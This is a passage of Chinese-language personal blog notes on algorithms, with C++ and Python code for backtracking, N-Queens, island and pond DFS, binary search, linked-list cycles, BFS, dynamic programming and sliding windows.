class="line">    &#125;</span><br><span class="line">    for(int i=0;i&lt;a.size();i++)&#123;</span><br><span class="line">        //排除不合法选项</span><br><span class="line">        if(used[i]) //已经访问过 </span><br><span class="line">        continue;</span><br><span class="line">        //选择</span><br><span class="line">       // cout&lt;&lt;&quot;xuanze:&quot;&lt;&lt;a[i]&lt;&lt;endl;</span><br><span class="line">        path.push_back(a[i]);</span><br><span class="line">        used[i]=true;</span><br><span class="line">        //做下一个选择</span><br><span class="line">        backtrack(a,path,used);</span><br><span class="line">        //撤销选择</span><br><span class="line">        path.pop_back();</span><br><span class="line">        used[i]=false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="N皇后"><a href="#N皇后" class="headerlink" title="N皇后"></a>N皇后</h2><p>n*n的棋盘，放n个皇后，每行放一个，不得互相攻击，求可能的放法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;string&gt; &gt;res;</span><br><span class="line">bool isvalid(vector&lt;string&gt; &amp;board,int row,int col);</span><br><span class="line">void backtrack(vector&lt;string&gt; a,int row);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    vector&lt;string&gt; board(n,string(n,&#x27;.&#x27;));//棋盘</span><br><span class="line">  </span><br><span class="line">    backtrack(board,0);//从第0行开始放</span><br><span class="line"></span><br><span class="line">    for(auto li:res)</span><br><span class="line">    &#123;</span><br><span class="line">        for(auto lii:li)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;lii&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">           </span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void backtrack(vector&lt;string&gt; a,int row)</span><br><span class="line">&#123;</span><br><span class="line">    //触发结束条件</span><br><span class="line">    if(row==a.size())</span><br><span class="line">    &#123;</span><br><span class="line">        res.push_back(a);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">     int n=a[row].size();</span><br><span class="line">    for(int col=0;col&lt;n;col++)&#123;</span><br><span class="line">        //排除不合法选项</span><br><span class="line">       </span><br><span class="line">        if(!isvalid(a,row,col))</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        //选择</span><br><span class="line">        a[row][col]=&#x27;Q&#x27;;</span><br><span class="line">        //做下一个选择</span><br><span class="line">        backtrack(a,row+1);</span><br><span class="line"> </span><br><span class="line">        //撤销选择</span><br><span class="line">        a[row][col]=&#x27;.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">bool isvalid(vector&lt;string&gt; &amp;board,int row,int col)</span><br><span class="line">&#123;</span><br><span class="line">    int n=board.size();//行</span><br><span class="line">    //两行之间垂直，遇到左上，遇到右上</span><br><span class="line">    for(int i=0;i&lt;=row;i++)//列</span><br><span class="line">    &#123;</span><br><span class="line">        if(board[i][col]==&#x27;Q&#x27;) return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //右上</span><br><span class="line">    for(int i=row-1,j=col+1;i&gt;=0&amp;&amp;j&lt;n;i--,j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(board[i][j]==&#x27;Q&#x27;) return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //左上</span><br><span class="line">    for(int i=row-1,j=col-1;i&gt;=0&amp;&amp;j&gt;=0;i--,j--)</span><br><span class="line">    &#123;</span><br><span class="line">        if(board[i][j]==&#x27;Q&#x27;) return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for xuanze in liebiao:</span><br><span class="line">	//筛选不符项</span><br><span class="line">	if(!valid()) continue;</span><br><span class="line">	//做选择</span><br><span class="line">	//下一个递归</span><br><span class="line">	//撤销选择</span><br></pre></td></tr></table></figure>

<p>是否有效，路径，结束条件</p>
<h2 id="463岛屿的周长"><a href="#463岛屿的周长" class="headerlink" title="463岛屿的周长"></a>463岛屿的周长</h2><p>先判断是否是岛屿，是就加4，再判断该格子的上下左右是否是岛屿，是，则有重叠部分，结果-1</p>
<h3 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int jisuan(vector&lt;vector&lt;int&gt;&gt;&amp; grid) </span><br><span class="line">   &#123;</span><br><span class="line">       int res=0;</span><br><span class="line">       int r=grid.size();</span><br><span class="line">       int c=grid[0].size();</span><br><span class="line">       for(int i=0;i&lt;r;i++)</span><br><span class="line">       &#123;</span><br><span class="line">           for(int j=0;j&lt;c;j++)</span><br><span class="line">           &#123;</span><br><span class="line">               if(grid[i][j]==1)</span><br><span class="line">               &#123;</span><br><span class="line">                   res+=4;</span><br><span class="line">                   if(i+1&lt;r&amp;&amp;grid[i+1][j]==1) res-=1;</span><br><span class="line">                   if(j+1&lt;c&amp;&amp;grid[i][j+1]==1) res-=1;</span><br><span class="line">                   if(i-1&gt;=0&amp;&amp;grid[i-1][j]==1) res-=1;</span><br><span class="line">                   if(j-1&gt;=0&amp;&amp;grid[i][j-1]==1) res-=1;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       return res;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>或者4*陆地数-2*重叠的边数(即，往下走和往右走，遇到陆地了，edge+1)</p>
<h3 id="dfs"><a href="#dfs" class="headerlink" title="dfs"></a>dfs</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int dfs(vector&lt;vector&lt;int&gt;&gt;&amp; grid,int r,int c) </span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">     //从一个岛屿走向边界，周长+1</span><br><span class="line">     if(r&lt;0||r&gt;=grid.size()||c&lt;0||c&gt;=grid[0].size()) return 1;</span><br><span class="line">     </span><br><span class="line">     if(grid[r][c]==0) return 1;//从陆地走向水域，周长+1</span><br><span class="line"></span><br><span class="line">     if(grid[r][c]!=1) return 0;//说明遍历过了</span><br><span class="line"></span><br><span class="line">     grid[r][c]=2;//表示访问过</span><br><span class="line"></span><br><span class="line">     return dfs(grid,r-1,c)+ dfs(grid, r + 1, c)+ dfs(grid, r, c - 1)+ dfs(grid, r, c + 1);</span><br><span class="line"> &#125;</span><br><span class="line"> int islandPerimeter(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123;</span><br><span class="line"></span><br><span class="line">     int res=0;</span><br><span class="line">     for(int i=0; i&lt;grid.size(); i++)&#123;</span><br><span class="line">         for(int j=0; j&lt;grid[0].size(); j++)&#123;</span><br><span class="line">             if(grid[i][j]==1)&#123;</span><br><span class="line">                 res+= dfs(grid, i, j);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return res;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="水域大小"><a href="#水域大小" class="headerlink" title="水域大小"></a>水域大小</h2><p>给一个矩阵，数值为0的点为水域，水域通过垂直、水平或者对角连接，就称为池塘，求池塘的大小（从小到大）</p>
<p>思路：dfs，求8个方向（行从-1,0,1到列-1,0,1），如果是水域，且没访问过，size++;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int dfs(vector&lt;vector&lt;int&gt; &gt;a,vector&lt;vector&lt;bool&gt; &gt;&amp; visit,int i,int j )</span><br><span class="line">&#123;</span><br><span class="line">    if(i&lt;0||i&gt;=a.size()||j&lt;0||j&gt;=a[0].size()||a[i][j]!=0||visit[i][j]) return 0;</span><br><span class="line"></span><br><span class="line">    int size=1;</span><br><span class="line">    visit[i][j]=true;</span><br><span class="line">    for(int r=-1;r&lt;=1;r++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(int c=-1;c&lt;=1;c++)</span><br><span class="line">            size+=dfs(a,visit,i+r,j+c);</span><br><span class="line">    &#125;</span><br><span class="line">    return size;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">vector&lt;vector&lt;int&gt; &gt;a=&#123;</span><br><span class="line">     &#123;0,2,1,0&#125;,</span><br><span class="line">  &#123;0,1,0,1&#125;,</span><br><span class="line">  &#123;1,1,0,1&#125;,</span><br><span class="line">  &#123;0,1,0,1&#125;</span><br><span class="line">&#125;;</span><br><span class="line">int row=a.size(),col=a[0].size();</span><br><span class="line"></span><br><span class="line">vector&lt;vector&lt;bool&gt; &gt;visit(row,vector&lt;bool&gt;(col,false));</span><br><span class="line">vector&lt;int&gt; result;</span><br><span class="line">for(int i=0;i&lt;row;i++)</span><br><span class="line">for(int j=0;j&lt;col;j++)</span><br><span class="line">&#123;</span><br><span class="line">    if(a[i][j]==0&amp;&amp;!visit[i][j])</span><br><span class="line">    &#123;</span><br><span class="line">        int size=dfs(a,visit,i,j);</span><br><span class="line">        result.push_back(size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   for(int tem:result)</span><br><span class="line">   cout&lt;&lt;tem&lt;&lt;&quot; &quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int left=0,right=...;</span><br><span class="line">while(...)//注意点</span><br><span class="line">&#123;</span><br><span class="line">int mid=left+(right-left)/2;//防止溢出</span><br><span class="line">if(nums[mid]==target)</span><br><span class="line">...</span><br><span class="line">else if(&lt;)</span><br><span class="line">left=mid+1;</span><br><span class="line">else if(&gt;)</span><br><span class="line">right=mid-1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="寻找一个数"><a href="#寻找一个数" class="headerlink" title="寻找一个数"></a>寻找一个数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int l=0,r=nums.size()-1;</span><br><span class="line">while(l&lt;=r)</span><br><span class="line">&#123;</span><br><span class="line">	int mid=left+(right-left)/2;//防止溢出</span><br><span class="line">if(nums[mid]==target)</span><br><span class="line">return mid;</span><br><span class="line">else if(&lt;)</span><br><span class="line">left=mid+1;</span><br><span class="line">else if(&gt;)</span><br><span class="line">right=mid-1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是有序数组 2 3 3 3 4 5 6，target为3，求得的索引会是2，得不到左边的3和右边的3</p>
<h1 id="链表环"><a href="#链表环" class="headerlink" title="链表环"></a>链表环</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct List&#123;</span><br><span class="line">    int val;</span><br><span class="line">    List* next;</span><br><span class="line"></span><br><span class="line">    List(int x):val(x),next(nullptr)&#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">List* huan(List* list)</span><br><span class="line">&#123;</span><br><span class="line">    List* p1=list;</span><br><span class="line">    List* p2=list;</span><br><span class="line"></span><br><span class="line">    while(p2)</span><br><span class="line">    &#123;</span><br><span class="line">        p1=p1-&gt;next;</span><br><span class="line">        if(p2-&gt;next)</span><br><span class="line">        &#123;</span><br><span class="line">            p2=p2-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        else return nullptr;</span><br><span class="line"></span><br><span class="line">        if(p1==p2)</span><br><span class="line">        &#123;</span><br><span class="line">            List *p3=list;</span><br><span class="line">            while(p3!=p1)</span><br><span class="line">            &#123;</span><br><span class="line">                p1=p1-&gt;next;</span><br><span class="line">                p3=p3-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            return p3;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return nullptr;</span><br><span class="line">&#125;</span><br><span class="line">set&lt;List*&gt; st;</span><br><span class="line">List* huan2(List* list)</span><br><span class="line">&#123;</span><br><span class="line">    List*p =list;</span><br><span class="line">    while(p)</span><br><span class="line">    &#123;</span><br><span class="line">        if(st.count(p)) return p;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            st.insert(p);</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    return nullptr;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    // List* list=new List(3);</span><br><span class="line">    // list-&gt;next=new List(2);</span><br><span class="line">    // list-&gt;next-&gt;next=new List(0);</span><br><span class="line">    // list-&gt;next-&gt;next-&gt;next=new List(-4);</span><br><span class="line">    // list-&gt;next-&gt;next-&gt;next-&gt;next=list-&gt;next;</span><br><span class="line">    List* list=nullptr;</span><br><span class="line">    List* cur=nullptr;</span><br><span class="line">    int t;</span><br><span class="line">    while(cin&gt;&gt;t)</span><br><span class="line">    &#123;</span><br><span class="line">        if(t==-1) break;</span><br><span class="line">        if(!list)</span><br><span class="line">        &#123;</span><br><span class="line">            list=new List(t);//第一个节点</span><br><span class="line">            cur=list;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            cur-&gt;next=new List(t);</span><br><span class="line">            cur=cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(list&amp;&amp;cur)</span><br><span class="line">    cur-&gt;next=list-&gt;next;//环</span><br><span class="line">    // cur=list;</span><br><span class="line">    // // while(cur)</span><br><span class="line">    // // &#123;</span><br><span class="line">    // //     cout&lt;&lt;cur-&gt;val&lt;&lt;&quot; &quot;;</span><br><span class="line">    // //     cur=cur-&gt;next;</span><br><span class="line">    // // &#125;</span><br><span class="line">    cur=list;</span><br><span class="line">    List* p=huan2(cur);</span><br><span class="line">    cout&lt;&lt;p-&gt;val;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>链表相交</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List* create(vector&lt;int&gt; a)</span><br><span class="line">&#123;</span><br><span class="line">        List* list=nullptr;</span><br><span class="line">    List* cur=nullptr;</span><br><span class="line"></span><br><span class="line">    for(int tem:a)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!list)</span><br><span class="line">        &#123;</span><br><span class="line">            list=new List(tem);</span><br><span class="line">            cur=list;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            cur-&gt;next=new List(tem);</span><br><span class="line">            cur=cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    return list;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    // List* list=new List(3);</span><br><span class="line">    // list-&gt;next=new List(2);</span><br><span class="line">    // list-&gt;next-&gt;next=new List(0);</span><br><span class="line">    // list-&gt;next-&gt;next-&gt;next=new List(-4);</span><br><span class="line">    // list-&gt;next-&gt;next-&gt;next-&gt;next=list-&gt;next;</span><br><span class="line"></span><br><span class="line">    vector&lt;int&gt; a=&#123;4,1,8,4,5&#125;;</span><br><span class="line">    vector&lt;int&gt; b=&#123;5,0,1,8,4,5&#125;;</span><br><span class="line">    List* p1=create(a);</span><br><span class="line">    List* p2=new List(5);</span><br><span class="line">    List*cur =p1;</span><br><span class="line"></span><br><span class="line">    int i=0;</span><br><span class="line">    while(i&lt;2)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;cur-&gt;val&lt;&lt;endl;</span><br><span class="line">        cur=cur-&gt;next;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">   // cout&lt;&lt;cur-&gt;val&lt;&lt;endl;</span><br><span class="line">    p2-&gt;next=new List(0);</span><br><span class="line">    p2-&gt;next-&gt;next=new List(1);</span><br><span class="line">    p2-&gt;next-&gt;next-&gt;next=cur;</span><br><span class="line">    List* p3=jiao(p1,p2);</span><br><span class="line">    cout&lt;&lt;p3-&gt;val;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h1><p>找最短路径</p>
<p>本质是图，从起点走到终点，求最短路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int BFS(Node start, Node target)</span><br><span class="line">&#123;</span><br><span class="line">    queue&lt;Node&gt; q;</span><br><span class="line">    set&lt;Node&gt; visited;//避免回头</span><br><span class="line"></span><br><span class="line">    q.push(start);</span><br><span class="line">    visited.insert(start);</span><br><span class="line"></span><br><span class="line">    while (!q.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        int size = q.size();</span><br><span class="line">        for (int i = 0; i &lt; size; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Node cur = q.front();</span><br><span class="line">            q.pop();</span><br><span class="line">            if (cur == target)</span><br><span class="line">                return step;</span><br><span class="line"></span><br><span class="line">            for (auto x : cur的相邻结点)</span><br><span class="line">            &#123;</span><br><span class="line">                if (visited.count(x) == 0)</span><br><span class="line">                &#123;</span><br><span class="line">                    q.push(x);</span><br><span class="line">                    visited.insert(x);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //否则没有找到目标结点</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><p>核心问题：穷举</p>
<p>解决对象：一般求最值</p>
<p>dp前提：</p>
<blockquote>
<p>1.具有最优子结构</p>
<p>2.通过子问题最值得到原问题最值</p>
<p>3.正确的状态转移方程</p>
</blockquote>
<p>优化：备忘录、DP table</p>
<h2 id="状态转移方程"><a href="#状态转移方程" class="headerlink" title="状态转移方程"></a>状态转移方程</h2><p>明确<strong>base case</strong> -&gt;明确 <strong>状态</strong> -&gt; 明确 <strong>选择</strong>-&gt;定义 <strong>dp数组</strong>的含义</p>
<p>基本框架</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 自顶向下递归的动态规划</span><br><span class="line">def dp(状态1, 状态2, ...):</span><br><span class="line">    for 选择 in 所有可能的选择:</span><br><span class="line">        # 此时的状态已经因为做了选择而改变</span><br><span class="line">        result = 求最值(result, dp(状态1, 状态2, ...))</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"># 自底向上迭代的动态规划</span><br><span class="line"># 初始化 base case</span><br><span class="line">dp[0][0][...] = base case</span><br><span class="line"># 进行状态转移</span><br><span class="line">for 状态1 in 状态1的所有取值：</span><br><span class="line">    for 状态2 in 状态2的所有取值：</span><br><span class="line">        for ...</span><br><span class="line">            dp[状态1][状态2][...] = 求最值(选择1，选择2...)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="以斐波那契为例-重叠子问题的消除方法"><a href="#以斐波那契为例-重叠子问题的消除方法" class="headerlink" title="以斐波那契为例(重叠子问题的消除方法)"></a>以斐波那契为例(重叠子问题的消除方法)</h2><p>它不是求最值，严格来讲不是动态规划问题</p>
<p><strong>暴力递归</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int fib(int N) &#123;</span><br><span class="line">    if (N == 1 || N == 2) return 1;</span><br><span class="line">    return fib(N - 1) + fib(N - 2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果n&#x3D;20，那么自顶向下的<strong>递归树</strong>就是</p>
<p><img src="/../../../Typora/img111/image-20230806174428184.png" alt="image-20230806174428184"></p>
<p>会遇到<strong>重叠子问题</strong>，比如f(17)，上述递归树就是说，想知道f(20)，去求f(19)和f(18)。。。直至求f(1)和f(2)</p>
<p>递归时间的复杂度就是*<em>子问题个数(结点总数)<em>解决一个子问题所需时间(比如循环算法)</em></em></p>
<p>上述时间为O(2ⁿ)*O(1)</p>
<p>为了优化，引入了<strong>备忘录解法</strong>和<strong>递推解法</strong></p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h3><p><strong>自顶向下</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int fib(int n)</span><br><span class="line">&#123;</span><br><span class="line">	//初始化为0</span><br><span class="line">	vector&lt;int&gt; memo(n+1,0);</span><br><span class="line">	return dp(memo,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int dp(vector&lt;int&gt;memo,int n)</span><br><span class="line">&#123;</span><br><span class="line">	//base case</span><br><span class="line">	if(n==0||n==1) return 0;</span><br><span class="line">	//如果计算过</span><br><span class="line">	if(memo[n]!=0) return memo[n];</span><br><span class="line">	memo[n]=dp(memo,n-1)+dp(memo,n-2);</span><br><span class="line">	return memo[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于将递归树大量冗余的部分进行了 <strong>剪枝</strong></p>
<p><strong>减少了子问题中结点的个数</strong></p>
<p>子问题就是 <code>f(1)</code>, <code>f(2)</code>, <code>f(3)</code> … <code>f(20)</code>，n个值</p>
<p>时间复杂度O(n)</p>
<h3 id="递推"><a href="#递推" class="headerlink" title="递推"></a>递推</h3><p><strong>自底向上</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int fib(int n)</span><br><span class="line">&#123;</span><br><span class="line">	if(n==0) return 0;</span><br><span class="line">	int *dp=new int[n+1];</span><br><span class="line">	//base case</span><br><span class="line">	dp[0]=0;dp[1]=1;</span><br><span class="line">	//状态转移</span><br><span class="line">	for(int i=2;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	dp[i]=dp[i-1]+dp[i-2];</span><br><span class="line">	&#125;</span><br><span class="line">	return dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="滚动"><a href="#滚动" class="headerlink" title="滚动"></a>滚动</h3><p>上述的斐波那契算法，会发现，当前n状态只和n-1状态、n-2状态有关</p>
<p>所以可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int fit(int n)</span><br><span class="line">&#123;</span><br><span class="line">	if(n==0||n==1) return n;</span><br><span class="line">	int tem1=0,tem2=0;</span><br><span class="line">	for(int 2=0;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		int result=tem1+tem2;</span><br><span class="line">		tem2=tem1;</span><br><span class="line">		tem1=result;</span><br><span class="line">	&#125;</span><br><span class="line">	return tem1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="凑零钱问题-最优子结构"><a href="#凑零钱问题-最优子结构" class="headerlink" title="凑零钱问题(最优子结构)"></a>凑零钱问题(最优子结构)</h2><p><strong>最优子结构满足条件：子问题间独立</strong></p>
<p>给你 <code>k</code> 种面值的硬币，面值分别为 <code>c1, c2 ... ck</code>，每种硬币的数量无限，再给一个总金额 <code>amount</code>，问你<strong>最少</strong>需要几枚硬币凑出这个金额，如果不可能凑出，算法返回 -1 </p>
<p>暴力递归法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int dp(vector&lt;int&gt; coin,int amount)</span><br><span class="line">&#123;</span><br><span class="line">	if(amount==0) return 0;//base </span><br><span class="line">	else if(amount&lt;0) return -1;</span><br><span class="line">	int res=INT_MAX;</span><br><span class="line">	for(auto a:coin)</span><br><span class="line">	&#123;</span><br><span class="line">		//计算子问题</span><br><span class="line">		int subcoin=dp(coin,amount-coin);</span><br><span class="line">		if(subcoin==-1) continue;</span><br><span class="line">		//子问题中选择最优解</span><br><span class="line">		res=min(res,subcoin+1);//+1表示使用了当前硬币</span><br><span class="line">	&#125;</span><br><span class="line">	return res==INT_MAX ? -1:res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了优化，这里用递推</p>
<p>定义dp[i]，目标金额为i，至少需要dp[i]枚硬币</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int findcoin(vector&lt;int&gt; a,int amount)</span><br><span class="line">&#123;</span><br><span class="line">	if(amount==0) return 0;</span><br><span class="line">	vector&lt;int&gt; dp(amount+1,amount+1);</span><br><span class="line">	dp[0]=0;</span><br><span class="line">	//遍历dp数组</span><br><span class="line">	for(int i=0;i&lt;dp.size();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		//遍历硬币</span><br><span class="line">		for(int tem:a)</span><br><span class="line">		&#123;</span><br><span class="line">		//别忘了，i现在指代的是目标金额，tem是coin的元素</span><br><span class="line">			if(i-tem&lt;0) continue;</span><br><span class="line">			dp[i]=min(dp[i],dp[i-tem]+1);</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	return (dp[amount]==amount+1)?-1:dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="300-最长递增子序列"><a href="#300-最长递增子序列" class="headerlink" title="300.最长递增子序列"></a>300.最长递增子序列</h2><p>给你一个整数数组 <code>nums</code> ，找到其中最长严格递增子序列的长度。</p>
<p><strong>子序列</strong> 是由数组派生而来的序列，删除（或不删除）数组中的元素而不改变其余元素的顺序。例如，<code>[3,6,2,7]</code> 是数组 <code>[0,3,1,6,2,2,7]</code> 的子序列。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [10,9,2,5,3,7,101,18]</span><br><span class="line">输出：4</span><br><span class="line">解释：最长递增子序列是 [2,3,7,101]，因此长度为 4 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [0,1,0,3,2,3]</span><br><span class="line">输出：4</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [7,7,7,7,7,7,7]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>

<p>1.去定义一个dp数组，其意义为从nums取前i个元素时，最长递增长度为dp[i]</p>
<p>2.那么i相当于每次新数组的最后一位，那么再来个for循环，从0遍历到i</p>
<p>3.如果nums[j]&lt;nums[i]，那么dp[i]&#x3D;max(dp[i],dp[j]+1);这个+1表示使用了当前数</p>
<p>4.更新res</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int findlength(vector&lt;int&gt; nums)</span><br><span class="line">  &#123;</span><br><span class="line">      int res=0;</span><br><span class="line">      int n=nums.size();</span><br><span class="line">      if(nums.size()==0) return 0;</span><br><span class="line">      vector&lt;int&gt;dp(n+1,0);//记dp[i]表示一个递增数组，元素个数为i时的最长递增长度为dp[i]</span><br><span class="line">      for(int i=0;i&lt;nums.size();i++)//定义i为数组的最后一位</span><br><span class="line">      &#123;</span><br><span class="line">          dp[i]=1;</span><br><span class="line">          for(int j=0;j&lt;i;j++)//从0遍历到i</span><br><span class="line">          &#123;</span><br><span class="line">              if(nums[i]&gt;nums[j])//</span><br><span class="line">                  dp[i]=max(dp[i],dp[j]+1);</span><br><span class="line">          &#125;</span><br><span class="line">          res=max(res,dp[i]);</span><br><span class="line">      &#125;</span><br><span class="line">      return res;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>时间复杂度O(n²)</p>
<h1 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def findSubArray(nums):</span><br><span class="line">    N = len(nums) # 数组/字符串长度</span><br><span class="line">    left, right = 0, 0 # 双指针，表示当前遍历的区间[left, right]，闭区间</span><br><span class="line">    sums = 0 # 用于统计 子数组/子区间 是否有效，根据题目可能会改成求和/计数</span><br><span class="line">    res = 0 # 保存最大的满足题目要求的 子数组/子串 长度</span><br><span class="line">    while right &lt; N: # 当右边的指针没有搜索到 数组/字符串 的结尾</span><br><span class="line">        sums += nums[right] # 增加当前右边指针的数字/字符的求和/计数</span><br><span class="line">        while 区间[left, right]不符合题意: # 此时需要一直移动左指针，直至找到一个符合题意的区间</span><br><span class="line">            sums -= nums[left] # 移动左指针前需要从counter中减少left位置字符的求和/计数</span><br><span class="line">            left += 1 # 真正的移动左指针，注意不能跟上面一行代码写反</span><br><span class="line">        # 到 while 结束时，我们找到了一个符合题意要求的 子数组/子串</span><br><span class="line">        res = max(res, right - left + 1) # 需要更新结果</span><br><span class="line">        right += 1 # 移动右指针，去探索新的区间</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">作者：负雪明烛</span><br><span class="line">链接：https://leetcode.cn/problems/max-consecutive-ones-iii/solutions/609055/fen-xiang-hua-dong-chuang-kou-mo-ban-mia-f76z/</span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>

<h2 id="1004-最大连续1的个数"><a href="#1004-最大连续1的个数" class="headerlink" title="1004 最大连续1的个数"></a>1004 最大连续1的个数</h2><p>最大可翻转k个0，求数组中连续1最大的个数</p>
